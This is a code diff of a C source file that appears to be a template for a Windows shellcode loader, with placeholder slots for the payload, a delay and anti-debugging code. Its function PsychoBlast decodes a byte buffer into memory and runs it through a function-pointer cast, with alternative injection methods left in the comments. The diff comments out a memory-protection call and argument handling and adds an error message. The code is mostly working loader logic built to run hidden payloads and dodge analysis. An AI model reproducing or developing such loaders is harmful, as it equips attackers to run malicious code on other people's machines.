@@ -17,6 +17,7 @@
 
 //####CODE####
 
+
 DWORD WINAPI PsychoBlast(LPVOID lpParameter)
 {
     DWORD dwSize;
@@ -27,7 +28,7 @@ DWORD WINAPI PsychoBlast(LPVOID lpParameter)
 
     unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
     memcpy(encoded, raw, length);
-    SIZE_T bytesWritten;
+    //SIZE_T bytesWritten;
 
     //####CALL####
 
@@ -44,28 +45,31 @@ DWORD WINAPI PsychoBlast(LPVOID lpParameter)
     //VOID* mem = VirtualAllocEx(currentProcess, NULL, length + 1, 0x00002000 | 0x00001000, PAGE_READWRITE);
     if (mem == NULL)
         return -1;
-    VirtualProtect(mem, length, 0x40, &dwSize);
+    //VirtualProtect(mem, length, 0x40, &dwSize);
 
     bool success = false;
-    // Method 1: No process Specified 
+    // Method 1: No process Specified
+
     success = memcpy(mem, decoded, length);
 
     // Method 2: Specifying current process 
     // success = WriteProcessMemory(currentProcess, mem, decoded, length, &bytesWritten);
-    if (!success)
+    if (!success){
+        printf("[-] Oh gosh, something went wrong!\n");
         return -2;
+    }
     
     int ret_val = 0;
     printf("[*] Executing\n");
     // Method 1: No process Specified, using function pointer
-    int (*my_main)(char**) = (int(*)(char**)) ((ULONGLONG)mem);
+    //int (*my_main)(char**) = (int(*)(char**)) ((ULONGLONG)mem);
     // With no params, this definition would be good as well
     ((void(*)())mem)();
 
-    char** args = (char**)lpParameter;
+    //char** args = (char**)lpParameter;
 
-    ret_val = my_main(args);
-    free(args);
+    //ret_val = my_main(args);
+    //free(args);
 
     // Method 2: No process specified, using CreateThread
     //CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, NULL);
@@ -91,9 +95,8 @@ int main()
 {
     //####DELAY####
     //####ANTIDEBUG####
-    char** args = NULL;
     //####ARGS####
 
-    PsychoBlast((LPVOID)args);
+    PsychoBlast(NULL);
 }
 
